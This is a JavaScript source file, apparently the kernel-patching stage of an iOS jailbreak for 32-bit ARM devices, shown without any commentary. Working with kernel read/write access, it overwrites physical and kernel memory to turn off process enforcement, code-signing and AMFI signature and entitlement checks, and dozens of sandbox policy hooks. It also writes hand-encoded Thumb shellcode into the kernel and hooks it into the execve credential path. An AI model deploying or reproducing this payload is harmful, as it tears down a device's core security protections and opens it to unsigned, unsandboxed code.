
function phys_set_nop(pa, count) {
    var size = count * 0x2;
    var data = util.create_data_buf(size);

    for (var i = 0; i < size; i+=0x2) {
        data.write(i, 0xbf00, 0x2);
    }
    
    physwrite_buf(pa, data.addr, size);
}

function apply_patches() {
    if (physread32(info.patches.proc_enforce) == 0) return 0;
    physwrite32(info.patches.proc_enforce, 0);
    physwrite32(info.patches.i_can_has_debugger_1, 1);
    physwrite32(info.patches.i_can_has_debugger_2, 1);
    physwrite32(info.patches.vm_fault_enter, 0x0b01f04f);
    physwrite32(info.patches.vm_map_enter, 0xbf00bf00);
    physwrite32(info.patches.vm_map_protect, 0xbf00bf00);
    physwrite16(info.patches.cs_system_require_lv, 0x2000);
    
    if (info.patches.csops_patch_size == 0x6) {
        physwrite32(info.patches.csops_patch, 0xbf00bf00);
        physwrite16(info.patches.csops_patch+0x4, 0xbf00);
    } else {
        physwrite32(info.patches.csops_patch, 0xbf00bf00);
    }
    
    physwrite8(info.patches.mount_patch+0x1, 0xe0);
    physwrite32(info.patches.mapForIO, 0xbf002000);
    physwrite32(info.patches.mapForIO+0x4, 0xbf00bf00);
    physwrite32(info.patches.kernelConfig_stub, info.patches.ret1_gadget + kinfo.kernel_slide);
    physwrite32(info.patches.sbcall_debugger, 0xbf00bf00);
    physwrite16(info.patches.pid_check, 0xbf00);
    
    if (info.version[1] == 3) {
        if (info.patches.sb_disable_size == 0x4) {
            physwrite32(info.patches.sb_disable, 0xbf00bf00);
        } else {
            physwrite16(info.patches.sb_disable, 0xbf00);
        }
        physwrite8(info.patches.locked_task+0x1, 0xe0);
    }
    
    var amfi_patch_data = util.create_data_buf(0x12);
    amfi_patch_data.write(0x0, 0xF421, 0x2);
    amfi_patch_data.write(0x2, 0x517C, 0x2);
    amfi_patch_data.write(0x4, 0x4620, 0x2);
    amfi_patch_data.write(0x6, 0xF041, 0x2);
    amfi_patch_data.write(0x8, 0x6180, 0x2);
    amfi_patch_data.write(0xa, 0xF041, 0x2);
    amfi_patch_data.write(0xc, 0x010F, 0x2);
    amfi_patch_data.write(0xe, 0xF8CA, 0x2);
    amfi_patch_data.write(0x10, 0x1000, 0x2);

    physwrite_buf(info.patches.amfi_cs_flags_patch, amfi_patch_data.addr, amfi_patch_data.size);
    phys_set_nop(info.patches.amfi_cred_label_update_execve, 2);
    physwrite32(info.patches.amfi_cred_label_update_execve+0x5, 0xe0);
    phys_set_nop(info.patches.amfi_vnode_check_signature, 10);
    phys_set_nop(info.patches.amfi_loadEntitlementsFromVnode, 3);
    physwrite16(info.patches.amfi_loadEntitlementsFromVnode+0x6, 0x2001);
    phys_set_nop(info.patches.amfi_vnode_check_exec, 6);
    
    var mpo_execve = info.patches.sb_ops + koffsetof('mpo', 'cred_label_update_execve');
    var mpo_execve_ptr = physread32(mpo_execve);
    
    var shc = util.create_data_buf(0x16c);
    shc.write(0x0, 0xbf082b00, 0x4);
    shc.write(0x4, 0xe7ffe0a7, 0x4);
    shc.write(0x8, 0xaf03b5f0, 0x4);
    shc.write(0xc, 0x0d00e92d, 0x4);
    shc.write(0x10, 0x466cb0f6, 0x4);
    shc.write(0x14, 0x0402f36f, 0x4);
    shc.write(0x18, 0xf8d746a5, 0x4);
    shc.write(0x1c, 0xf8d7900c, 0x4);
    shc.write(0x20, 0xf8d7c008, 0x4);
    shc.write(0x24, 0x6abce02c, 0x4);
    shc.write(0x28, 0x6a3e6a7d, 0x4);
    shc.write(0x2c, 0x801cf8d7, 0x4);
    shc.write(0x30, 0xa018f8d7, 0x4);
    shc.write(0x34, 0xb014f8d7, 0x4);
    shc.write(0x38, 0x6938901a, 0x4);
    shc.write(0x3c, 0x981a9019, 0x4);
    shc.write(0x40, 0xa81d9018, 0x4);
    shc.write(0x44, 0x20009017, 0x4);
    shc.write(0x48, 0x98189016, 0x4);
    shc.write(0x4c, 0x91749075, 0x4);
    shc.write(0x50, 0x93729273, 0x4);
    shc.write(0x54, 0x91c4f8cd, 0x4);
    shc.write(0x58, 0xc1c0f8cd, 0x4);
    shc.write(0x5c, 0xb054f8cd, 0x4);
    shc.write(0x60, 0x8050f8cd, 0x4);
    shc.write(0x64, 0xa04cf8cd, 0x4);
    shc.write(0x68, 0x95119612, 0x4);
    shc.write(0x6c, 0xe040f8cd, 0x4);
    shc.write(0x70, 0xf000940f, 0x4);
    shc.write(0x74, 0x901cf86a, 0x4);
    shc.write(0x78, 0x901e2000, 0x4);
    shc.write(0x7c, 0x9020901d, 0x4);
    shc.write(0x80, 0x3080f240, 0x4);
    shc.write(0x84, 0x9816901f, 0x4);
    shc.write(0x88, 0x98729021, 0x4);
    shc.write(0x8c, 0x99179a1c, 0x4);
    shc.write(0x90, 0xf85ef000, 0x4);
    shc.write(0x94, 0x2800906f, 0x4);
    shc.write(0x98, 0x2000d122, 0x4);
    shc.write(0x9c, 0xf8bd901b, 0x4);
    shc.write(0xa0, 0xf40000c0, 0x4);
    shc.write(0xa4, 0x28006000, 0x4);
    shc.write(0xa8, 0x2001d004, 0x4);
    shc.write(0xac, 0x9a74992e, 0x4);
    shc.write(0xb0, 0x901b60d1, 0x4);
    shc.write(0xb4, 0x00c0f8bd, 0x4);
    shc.write(0xb8, 0x6080f400, 0x4);
    shc.write(0xbc, 0xd0042800, 0x4);
    shc.write(0xc0, 0x992f2001, 0x4);
    shc.write(0xc4, 0x61d19a74, 0x4);
    shc.write(0xc8, 0x981b901b, 0x4);
    shc.write(0xcc, 0xd0072800, 0x4);
    shc.write(0xd0, 0xf8d09873, 0x4);
    shc.write(0xd4, 0xf44000bc, 0x4);
    shc.write(0xd8, 0x99737080, 0x4);
    shc.write(0xdc, 0x00bcf8c1, 0x4);
    shc.write(0xe0, 0x99749875, 0x4);
    shc.write(0xe4, 0x9b729a73, 0x4);
    shc.write(0xe8, 0x91c0f8dd, 0x4);
    shc.write(0xec, 0xc1c4f8dd, 0x4);
    shc.write(0xf0, 0xe010f8d7, 0x4);
    shc.write(0xf4, 0x69bd697c, 0x4);
    shc.write(0xf8, 0xf8d769fe, 0x4);
    shc.write(0xfc, 0xf8d78020, 0x4);
    shc.write(0x100, 0xf8d7a024, 0x4);
    shc.write(0x104, 0x900eb028, 0x4);
    shc.write(0x108, 0x900d6af8, 0x4);
    shc.write(0x10c, 0x900c4668, 0x4);
    shc.write(0x110, 0x910b980d, 0x4);
    shc.write(0x114, 0x6248990c, 0x4);
    shc.write(0x118, 0xb020f8c1, 0x4);
    shc.write(0x11c, 0xa01cf8c1, 0x4);
    shc.write(0x120, 0x8018f8c1, 0x4);
    shc.write(0x124, 0x610d614e, 0x4);
    shc.write(0x128, 0xf8c160cc, 0x4);
    shc.write(0x12c, 0xf8c1e008, 0x4);
    shc.write(0x130, 0xf8c1c004, 0x4);
    shc.write(0x134, 0x980e9000, 0x4);
    shc.write(0x138, 0xf000990b, 0x4);
    shc.write(0x13c, 0xf1a7f80c, 0x4);
    shc.write(0x140, 0x46a50418, 0x4);
    shc.write(0x144, 0x0d00e8bd, 0x4);
    shc.write(0x148, 0xa005bdf0, 0x4);
    shc.write(0x14c, 0x47006800, 0x4);
    shc.write(0x150, 0x681ba304, 0x4);
    shc.write(0x154, 0xf20f4718, 0x4);
    shc.write(0x158, 0xf8d90910, 0x4);
    shc.write(0x15c, 0x4760c000, 0x4);
    shc.write(0x160, (info.patches.vfsContextCurrent + kinfo.kernel_slide) | 0x1, 0x4);
    shc.write(0x164, (info.patches.vnodeGetattr + kinfo.kernel_slide) | 0x1, 0x4);
    shc.write(0x168, mpo_execve_ptr, 0x4);
    
    var shc_addr = kinfo.kernel_base + 0xd00;
    physwrite_buf(shc_addr - kinfo.kernel_slide, shc.addr, shc.size);
    var mpo_base = util.u32(info.patches.sb_ops + kinfo.kernel_slide);
    
    kwrite32(mpo_base + koffsetof('mpo', 'mount_check_mount'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'mount_check_remount'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'mount_check_umount'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_write'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'file_check_mmap'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_rename'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_access'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_chroot'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_create'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_deleteextattr'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_exchangedata'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_exec'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_getattrlist'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_getextattr'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_ioctl'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_link'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_listextattr'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_open'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_readlink'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_setattrlist'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_setextattr'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_setflags'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_setmode'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_setowner'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_setutimes'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_stat'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_truncate'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_unlink'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_notify_create'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_fsgetpath'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'vnode_check_getattr'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'mount_check_stat'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'proc_check_setauid'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'proc_check_getauid'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'proc_check_fork'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'proc_check_get_cs_info'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'proc_check_set_cs_info'), 0);
    kwrite32(mpo_base + koffsetof('mpo', 'cred_label_update_execve'), util.u32(shc_addr | 0x1));

    sys.thread_switch(sys.mach_thread_self(), 2, 1);
    sys.mach_vm_msync(kinfo.tfp0, kinfo.kernel_base + 0xd00, 0x200, VM_SYNC_INVALIDATE|VM_SYNC_SYNCHRONOUS);
    sys.thread_switch(sys.mach_thread_self(), 2, 1);

    for (var i = 0; i < 128; i++) {
        sys.thread_switch(sys.mach_thread_self(), 0, 10);
        sys.sync();
    }
    return 0;
}
